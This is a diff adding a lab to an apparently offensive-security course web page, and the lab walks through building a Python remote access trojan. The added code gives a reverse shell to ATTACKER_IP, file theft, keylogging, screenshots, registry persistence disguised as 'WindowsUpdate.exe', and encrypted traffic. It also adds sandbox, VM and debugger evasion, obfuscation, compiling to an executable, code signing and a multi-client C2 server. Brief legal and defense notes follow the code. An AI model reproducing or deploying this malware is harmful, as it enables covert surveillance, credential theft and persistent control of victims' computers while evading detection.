@@ -14162,27 +14162,702 @@ Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Ser
                 ADCS is THE most overlooked AD attack path in 2026. Check EVERY engagement! 🎫🔐</p>
             </div>
 
+            <h3>Lab 11: Complete Python Malware Development (RAT Creation)</h3>
+
+            <p><strong>Scenario:</strong> You need a custom Remote Access Trojan (RAT) for a red team engagement. Your mission: develop a Python-based RAT with command execution, file transfer, keylogging, screenshot capture, persistence, and AV evasion. This lab teaches malware development fundamentals, socket programming, Windows API usage, and evasion techniques—critical for advanced red teaming!</p>
+
+            <h4>Step 1: Basic RAT Architecture</h4>
+
+            <div class="code"># RAT components:
+# 1. Server (attacker machine) - receives connections
+# 2. Client (victim machine) - connects back to server
+
+# Client connects to server → establishes reverse shell
+# Server sends commands → client executes → sends output back
+
+# Why reverse shell instead of bind shell?
+# • Victim initiates connection (bypasses incoming firewall rules)
+# • NAT traversal (works from internal networks)
+# • More stealthy (outbound traffic less monitored)
+
+# Tech stack:
+# • Python 3 (cross-platform)
+# • socket module (networking)
+# • subprocess (command execution)
+# • pyautogui (screenshots)
+# • pynput (keylogging)
+# • pyinstaller (compile to EXE)
+# • Base64 (data encoding)
+# • AES encryption (traffic encryption)</div>
+
+            <h4>Step 2: Simple Reverse Shell (Foundation)</h4>
+
+            <div class="code"># client.py (runs on victim):
+import socket
+import subprocess
+import os
+
+SERVER_IP = "ATTACKER_IP"
+SERVER_PORT = 4444
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((SERVER_IP, SERVER_PORT))
+    
+    while True:
+        # Receive command
+        command = s.recv(1024).decode()
+        
+        if command.lower() == "exit":
+            break
+        
+        if command.lower() == "":
+            continue
+        
+        # Execute command
+        output = subprocess.getoutput(command)
+        
+        # Send output back
+        s.send(output.encode())
+    
+    s.close()
+
+if __name__ == "__main__":
+    connect()
+
+# server.py (runs on attacker):
+import socket
+
+def start_server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", 4444))
+    server.listen(1)
+    
+    print("[*] Listening on port 4444...")
+    
+    client_socket, client_address = server.accept()
+    print(f"[+] Connection from {client_address}")
+    
+    while True:
+        command = input("Shell> ")
+        
+        if command.lower() == "exit":
+            client_socket.send(command.encode())
+            break
+        
+        client_socket.send(command.encode())
+        output = client_socket.recv(4096).decode()
+        print(output)
+    
+    client_socket.close()
+    server.close()
+
+if __name__ == "__main__":
+    start_server()
+
+# Test:
+# Terminal 1 (server): python3 server.py
+# Terminal 2 (client): python3 client.py
+# 
+# Shell> whoami
+# Output: user
+# Shell> pwd
+# Output: /home/user</div>
+
+            <h4>Step 3: Advanced Features (File Transfer)</h4>
+
+            <div class="code"># Enhanced client.py with file operations:
+import socket
+import subprocess
+import os
+import base64
+
+SERVER_IP = "ATTACKER_IP"
+SERVER_PORT = 4444
+
+def execute_command(command):
+    try:
+        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+    except:
+        return b"Command execution failed"
+
+def download_file(filename):
+    # Client downloads file FROM victim
+    try:
+        with open(filename, "rb") as f:
+            data = f.read()
+            # Base64 encode to safely send binary data
+            encoded = base64.b64encode(data)
+            return b"[FILE_START]" + encoded + b"[FILE_END]"
+    except:
+        return b"File not found"
+
+def upload_file(filename, data):
+    # Client uploads file TO victim
+    try:
+        decoded = base64.b64decode(data)
+        with open(filename, "wb") as f:
+            f.write(decoded)
+        return b"File uploaded successfully"
+    except:
+        return b"File upload failed"
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((SERVER_IP, SERVER_PORT))
+    
+    while True:
+        command = s.recv(4096).decode()
+        
+        if command.lower() == "exit":
+            break
+        
+        # File download: download /path/to/file
+        if command.startswith("download "):
+            filename = command.split(" ", 1)[1]
+            output = download_file(filename)
+        
+        # File upload: upload /path/to/file [BASE64_DATA]
+        elif command.startswith("upload "):
+            parts = command.split(" ", 2)
+            filename = parts[1]
+            data = parts[2]
+            output = upload_file(filename, data)
+        
+        # Change directory: cd /path
+        elif command.startswith("cd "):
+            try:
+                os.chdir(command.split(" ", 1)[1])
+                output = f"Changed directory to: {os.getcwd()}".encode()
+            except:
+                output = b"Directory change failed"
+        
+        # Regular command
+        else:
+            output = execute_command(command)
+        
+        # Send output
+        s.send(output)
+    
+    s.close()
+
+if __name__ == "__main__":
+    connect()
+
+# Enhanced server.py:
+import socket
+import base64
+
+def handle_download(client_socket, data):
+    # Extract file data from response
+    start = data.find(b"[FILE_START]") + len(b"[FILE_START]")
+    end = data.find(b"[FILE_END]")
+    
+    if start != -1 and end != -1:
+        encoded_data = data[start:end]
+        decoded_data = base64.b64decode(encoded_data)
+        
+        # Save file
+        filename = input("Save as: ")
+        with open(filename, "wb") as f:
+            f.write(decoded_data)
+        
+        print(f"[+] File saved to: {filename}")
+
+def start_server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", 4444))
+    server.listen(1)
+    
+    print("[*] Listening on port 4444...")
+    
+    client_socket, client_address = server.accept()
+    print(f"[+] Connection from {client_address}")
+    
+    while True:
+        command = input("RAT> ")
+        
+        if command.lower() == "exit":
+            client_socket.send(command.encode())
+            break
+        
+        # Send command
+        client_socket.send(command.encode())
+        
+        # Receive output
+        output = client_socket.recv(409600)  # 400KB buffer for files
+        
+        # Handle file download
+        if b"[FILE_START]" in output:
+            handle_download(client_socket, output)
+        else:
+            print(output.decode(errors='ignore'))
+    
+    client_socket.close()
+    server.close()
+
+if __name__ == "__main__":
+    start_server()
+
+# Usage:
+# RAT> download C:\\Users\\victim\\passwords.txt
+# Save as: passwords.txt
+# [+] File saved to: passwords.txt</div>
+
+            <h4>Step 4: Persistence Mechanisms</h4>
+
+            <div class="code"># Add persistence to client.py:
+import winreg  # Windows Registry
+import shutil
+import sys
+
+def install_persistence():
+    # Copy to AppData
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        target_path = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate.exe')
+        
+        if not os.path.exists(target_path):
+            shutil.copy(exe_path, target_path)
+        
+        # Add to registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, target_path)
+        winreg.CloseKey(key)
+        
+        return True
+    except:
+        return False
+
+def connect():
+    # Install persistence on first run
+    install_persistence()
+    
+    # Rest of RAT code...
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((SERVER_IP, SERVER_PORT))
+            
+            # RAT loop...
+            
+        except:
+            # Reconnect every 60 seconds if connection fails
+            import time
+            time.sleep(60)
+            continue
+
+# Now RAT:
+# 1. Copies itself to C:\\Users\\User\\AppData\\Roaming\\WindowsUpdate.exe
+# 2. Adds registry key to run on startup
+# 3. Automatically reconnects if connection lost
+# 4. Survives reboots!</div>
+
+            <h4>Step 5: Keylogger & Screenshot Capture</h4>
+
+            <div class="code"># Install dependencies:
+# pip install pynput pyautogui pillow
+
+# Add to client.py:
+from pynput import keyboard
+import pyautogui
+from PIL import Image
+import io
+import threading
+
+# Global keylogger buffer
+keylog_buffer = []
+
+def on_key_press(key):
+    global keylog_buffer
+    try:
+        keylog_buffer.append(key.char)
+    except AttributeError:
+        # Special keys (space, enter, etc.)
+        keylog_buffer.append(f'[{key}]')
+
+def start_keylogger():
+    listener = keyboard.Listener(on_press=on_key_press)
+    listener.start()
+
+def capture_screenshot():
+    # Take screenshot
+    screenshot = pyautogui.screenshot()
+    
+    # Convert to bytes
+    img_buffer = io.BytesIO()
+    screenshot.save(img_buffer, format='PNG')
+    img_data = img_buffer.getvalue()
+    
+    # Base64 encode
+    encoded = base64.b64encode(img_data)
+    
+    return b"[SCREENSHOT_START]" + encoded + b"[SCREENSHOT_END]"
+
+def connect():
+    # Start keylogger in background thread
+    threading.Thread(target=start_keylogger, daemon=True).start()
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((SERVER_IP, SERVER_PORT))
+    
+    while True:
+        command = s.recv(4096).decode()
+        
+        # Get keylog
+        if command.lower() == "getkeylog":
+            global keylog_buffer
+            output = ''.join(keylog_buffer).encode()
+            keylog_buffer = []  # Clear buffer
+        
+        # Screenshot
+        elif command.lower() == "screenshot":
+            output = capture_screenshot()
+        
+        # ... other commands ...
+        
+        s.send(output)
+
+# Server receives screenshot:
+def handle_screenshot(data):
+    start = data.find(b"[SCREENSHOT_START]") + len(b"[SCREENSHOT_START]")
+    end = data.find(b"[SCREENSHOT_END]")
+    
+    encoded_data = data[start:end]
+    decoded_data = base64.b64decode(encoded_data)
+    
+    filename = f"screenshot_{int(time.time())}.png"
+    with open(filename, "wb") as f:
+        f.write(decoded_data)
+    
+    print(f"[+] Screenshot saved to: {filename}")</div>
+
+            <h4>Step 6: Encryption & AV Evasion</h4>
+
+            <div class="code"># Add AES encryption to traffic:
+# pip install pycryptodome
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+import hashlib
+
+# Shared secret key (hardcoded or derived)
+SECRET_KEY = b"MySecretKey12345"  # 16 bytes for AES-128
+
+def derive_key(password):
+    return hashlib.sha256(password).digest()[:16]
+
+AES_KEY = derive_key(SECRET_KEY)
+
+def encrypt_data(data):
+    cipher = AES.new(AES_KEY, AES.MODE_CBC)
+    encrypted = cipher.encrypt(pad(data, AES.block_size))
+    return cipher.iv + encrypted  # Prepend IV
+
+def decrypt_data(data):
+    iv = data[:16]
+    ciphertext = data[16:]
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+    return unpad(cipher.decrypt(ciphertext), AES.block_size)
+
+# Modify send/receive:
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((SERVER_IP, SERVER_PORT))
+    
+    while True:
+        # Receive and decrypt
+        encrypted_command = s.recv(4096)
+        command = decrypt_data(encrypted_command).decode()
+        
+        # Execute command
+        output = execute_command(command)
+        
+        # Encrypt and send
+        encrypted_output = encrypt_data(output)
+        s.send(encrypted_output)
+
+# Now all traffic is AES encrypted!
+# IDS/IPS can't read commands or exfiltrated data
+
+# Additional evasion techniques:
+
+# 1. Obfuscate strings:
+import base64
+
+SERVER_IP = base64.b64decode("MTkyLjE2OC4xLjEw").decode()  # 192.168.1.10
+SERVER_PORT = int(base64.b64decode("NDQ0NA==").decode())    # 4444
+
+# 2. Sleep before execution (sandbox evasion):
+import time
+time.sleep(60)  # Sleep 60s (sandboxes timeout after 30-60s)
+
+# 3. Check for VM/debugger:
+def is_vm():
+    # Check for VMware, VirtualBox, QEMU
+    try:
+        with open('/sys/class/dmi/id/product_name', 'r') as f:
+            product = f.read().lower()
+            if 'vmware' in product or 'virtualbox' in product:
+                return True
+    except:
+        pass
+    return False
+
+if is_vm():
+    sys.exit(0)  # Exit if running in VM
+
+# 4. Anti-analysis:
+import ctypes
+
+def is_debugger_present():
+    return ctypes.windll.kernel32.IsDebuggerPresent() != 0
+
+if is_debugger_present():
+    sys.exit(0)</div>
+
+            <h4>Step 7: Compile to Executable (PyInstaller)</h4>
+
+            <div class="code"># Install PyInstaller:
+pip install pyinstaller
+
+# Compile client to EXE:
+pyinstaller --onefile --noconsole --icon=icon.ico client.py
+
+# Flags:
+# --onefile    = Single EXE (no dependencies)
+# --noconsole  = No command window (GUI mode)
+# --icon       = Custom icon (looks legitimate)
+
+# Output: dist/client.exe
+
+# Advanced: Add UPX compression (smaller file size):
+pyinstaller --onefile --noconsole --upx-dir=/path/to/upx client.py
+
+# Result: ~8MB EXE with all features
+
+# Test:
+# Copy client.exe to Windows VM
+# Run server.py on Kali
+# Execute client.exe on Windows
+# RAT connects back!
+
+# Bypassing AV:
+
+# 1. Code obfuscation:
+pip install pyarmor
+
+# Obfuscate source:
+pyarmor obfuscate client.py
+
+# 2. Encrypt strings with custom function:
+def xor_encrypt(data, key):
+    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
+encrypted_ip = xor_encrypt(b"192.168.1.10", b"key")
+
+# 3. Load from memory (no disk writes):
+# Use python -c "exec()" to run from command line without file
+
+# 4. Split into multiple files:
+# client_main.py - main logic
+# client_utils.py - utilities
+# client_config.py - configuration
+# PyInstaller bundles all
+
+# 5. Sign executable (appears legitimate):
+# Use signtool.exe with code signing certificate
+signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com client.exe</div>
+
+            <h4>Step 8: C2 Server (Multi-Client Support)</h4>
+
+            <div class="code"># Enhanced server with multiple client support:
+import socket
+import threading
+import time
+
+clients = []  # List of connected clients
+
+def handle_client(client_socket, client_address):
+    print(f"[+] New connection from {client_address}")
+    clients.append({'socket': client_socket, 'address': client_address})
+    
+    try:
+        while True:
+            time.sleep(0.1)  # Keep connection alive
+    except:
+        clients.remove({'socket': client_socket, 'address': client_address})
+        print(f"[-] Connection lost from {client_address}")
+
+def list_clients():
+    print("\\n[*] Connected clients:")
+    for idx, client in enumerate(clients):
+        print(f"{idx}: {client['address']}")
+
+def interact_with_client(client_idx):
+    if client_idx >= len(clients):
+        print("[-] Invalid client index")
+        return
+    
+    client = clients[client_idx]
+    print(f"[*] Interacting with {client['address']}")
+    
+    while True:
+        command = input(f"RAT[{client['address']}]> ")
+        
+        if command.lower() == "back":
+            break
+        
+        if command.lower() == "exit":
+            client['socket'].send(command.encode())
+            client['socket'].close()
+            clients.remove(client)
+            break
+        
+        # Send command
+        encrypted_command = encrypt_data(command.encode())
+        client['socket'].send(encrypted_command)
+        
+        # Receive response
+        encrypted_output = client['socket'].recv(409600)
+        output = decrypt_data(encrypted_output)
+        
+        print(output.decode(errors='ignore'))
+
+def start_server():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", 4444))
+    server.listen(5)
+    
+    print("[*] C2 Server started on port 4444")
+    print("[*] Waiting for connections...")
+    
+    # Accept connections in background thread
+    def accept_connections():
+        while True:
+            client_socket, client_address = server.accept()
+            threading.Thread(
+                target=handle_client,
+                args=(client_socket, client_address),
+                daemon=True
+            ).start()
+    
+    threading.Thread(target=accept_connections, daemon=True).start()
+    
+    # Main command loop
+    while True:
+        command = input("C2> ")
+        
+        if command.lower() == "list":
+            list_clients()
+        
+        elif command.startswith("interact "):
+            try:
+                client_idx = int(command.split()[1])
+                interact_with_client(client_idx)
+            except:
+                print("[-] Usage: interact <client_index>")
+        
+        elif command.lower() == "exit":
+            break
+
+if __name__ == "__main__":
+    start_server()
+
+# Usage:
+# C2> list
+# [*] Connected clients:
+# 0: ('192.168.1.100', 49152)
+# 1: ('192.168.1.101', 49153)
+# 
+# C2> interact 0
+# [*] Interacting with ('192.168.1.100', 49152)
+# RAT[('192.168.1.100', 49152)]> whoami
+# DESKTOP-ABC123\\victim
+# RAT[('192.168.1.100', 49152)]> screenshot
+# [+] Screenshot saved to: screenshot_1704812400.png
+# RAT[('192.168.1.100', 49152)]> back
+# 
+# C2> interact 1
+# ...</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Lab 11 Key Takeaways</h4>
+                <p><strong>Python RAT features implemented:</strong><br>
+                • Remote command execution<br>
+                • File upload/download<br>
+                • Keylogging (pynput)<br>
+                • Screenshot capture (pyautogui)<br>
+                • Persistence (registry run key)<br>
+                • Auto-reconnection<br>
+                • AES encryption (traffic encryption)<br>
+                • Multi-client C2 server<br>
+                • AV evasion (obfuscation, VM detection)<br>
+                • PyInstaller compilation<br><br>
+                <strong>Real-world improvements:</strong><br>
+                • <strong>Domain generation algorithm (DGA):</strong> Generate C2 domains dynamically<br>
+                • <strong>HTTP/HTTPS tunneling:</strong> Use web traffic instead of raw sockets<br>
+                • <strong>Process injection:</strong> Inject into legitimate processes<br>
+                • <strong>Token stealing:</strong> Steal access tokens for impersonation<br>
+                • <strong>AMSI bypass:</strong> Disable Windows Antimalware Scan Interface<br>
+                • <strong>ETW patching:</strong> Disable Event Tracing for Windows<br>
+                • <strong>Sleep obfuscation:</strong> Encrypt in memory while sleeping<br>
+                • <strong>Indirect syscalls:</strong> Bypass userland hooks<br><br>
+                <strong>Legal warning:</strong><br>
+                • Creating malware = LEGAL for research/red teaming<br>
+                • Deploying malware without authorization = ILLEGAL<br>
+                • Always have written permission and scope<br>
+                • Test only in isolated environments<br>
+                • Follow responsible disclosure<br><br>
+                <strong>Defense:</strong><br>
+                • EDR solutions (detect process injection, suspicious API calls)<br>
+                • Network monitoring (detect C2 beaconing patterns)<br>
+                • Application whitelisting (block unauthorized executables)<br>
+                • Behavioral analysis (detect keyloggers, screenshot tools)<br><br>
+                Malware development is advanced offensive security. Understand how attackers think = better defense! 🐍💀</p>
+            </div>
+
             <div class="metaphor-box">
                 <h4>🎉 You're a Practical Attack Master!</h4>
-                <p>You've completed 5 comprehensive labs covering:<br><br>
+                <p>You've completed 11 comprehensive labs covering:<br><br>
                 ✅ <strong>Lab 1 - Web App Pentest:</strong> SQL injection → File upload → Privilege escalation → Root<br>
                 ✅ <strong>Lab 2 - Active Directory:</strong> AS-REP Roasting → BloodHound → Kerberoasting → Domain Admin → DCSync<br>
                 ✅ <strong>Lab 3 - Wireless:</strong> WEP cracking → WPA2 handshake → WPA3 Dragonblood<br>
                 ✅ <strong>Lab 4 - Mobile App:</strong> APK decompilation → Hardcoded secrets → IDOR API → Frida bypass → Certificate pinning<br>
-                ✅ <strong>Lab 5 - Forensics:</strong> Disk analysis → Timeline creation → Memory forensics → Data exfiltration tracking<br><br>
+                ✅ <strong>Lab 5 - Forensics:</strong> Disk analysis → Timeline creation → Memory forensics → Data exfiltration tracking<br>
+                ✅ <strong>Lab 6 - Buffer Overflow:</strong> Binary analysis → GDB debugging → Shellcode injection → SUID root shell<br>
+                ✅ <strong>Lab 7 - Container Escape:</strong> Docker/Kubernetes enumeration → Privileged pod → Host access → Cluster takeover<br>
+                ✅ <strong>Lab 8 - RFID Cloning:</strong> Proxmark3 → HID Prox badges → Mifare Classic → Physical access<br>
+                ✅ <strong>Lab 9 - SQLi to System:</strong> Union-based extraction → File write → Web shell → Privilege escalation → Persistence<br>
+                ✅ <strong>Lab 10 - ADCS ESC1:</strong> Certificate template exploitation → PKINIT auth → Domain Admin → Golden Ticket<br>
+                ✅ <strong>Lab 11 - Python RAT:</strong> Socket programming → Keylogging → Screenshots → Persistence → AV evasion → C2 server<br><br>
                 <strong>Key skills mastered:</strong><br>
                 • <strong>Enumeration:</strong> Finding attack surface from minimal information<br>
                 • <strong>Tool chaining:</strong> Combining nmap + gobuster + SQLmap + shell<br>
                 • <strong>Lateral movement:</strong> Using BloodHound paths to compromise targets<br>
                 • <strong>Credential attacks:</strong> AS-REP/Kerberoasting, hash cracking, Pass-the-Hash<br>
-                • <strong>Privilege escalation:</strong> SUID binaries, misconfigurations, Windows tokens<br>
-                • <strong>Wireless attacks:</strong> Understanding WEP/WPA/WPA3 differences<br><br>
+                • <strong>Privilege escalation:</strong> SUID binaries, misconfigurations, Windows tokens, kernel exploits<br>
+                • <strong>Wireless attacks:</strong> Understanding WEP/WPA/WPA3 differences<br>
+                • <strong>Binary exploitation:</strong> Buffer overflows, shellcode, memory corruption<br>
+                • <strong>Cloud security:</strong> Container escape, Kubernetes API exploitation<br>
+                • <strong>Physical security:</strong> RFID cloning, badge duplication<br>
+                • <strong>Advanced AD:</strong> ADCS vulnerabilities, certificate authentication, DCSync<br>
+                • <strong>Malware development:</strong> RATs, keyloggers, persistence, evasion<br><br>
                 <strong>What's next?</strong><br>
-                • Practice on: <strong>HackTheBox, TryHackMe, PentesterLab</strong><br>
-                • Get certified: <strong>OSCP, PNPT, eCPPT, CRTO</strong><br>
-                • Build labs: <strong>VulnHub VMs, Active Directory home lab</strong><br>
-                • Read writeups: <strong>0xdf.gitlab.io, ippsec.rocks</strong><br>
-                • Join community: <strong>Discord servers, Twitter #infosec, Reddit r/netsec</strong><br><br>
+                • Practice on: <strong>HackTheBox, TryHackMe, PentesterLab, PortSwigger Academy</strong><br>
+                • Get certified: <strong>OSCP, PNPT, eCPPT, CRTO, CRTP, OSEP</strong><br>
+                • Build labs: <strong>VulnHub VMs, Active Directory home lab, Docker environments</strong><br>
+                • Read writeups: <strong>0xdf.gitlab.io, ippsec.rocks, HackTricks</strong><br>
+                • Join community: <strong>Discord servers, Twitter #infosec, Reddit r/netsec, r/AskNetSec</strong><br>
+                • Bug bounties: <strong>HackerOne, Bugcrowd, Intigriti</strong><br>
+                • CTF teams: <strong>Join local CTF team, compete in DEF CON CTF qualifiers</strong><br><br>
                 You now understand complete attack chains. Every pentest follows similar patterns - adapt these workflows to new targets! 🚀🔥</p>
             </div>
         </section>
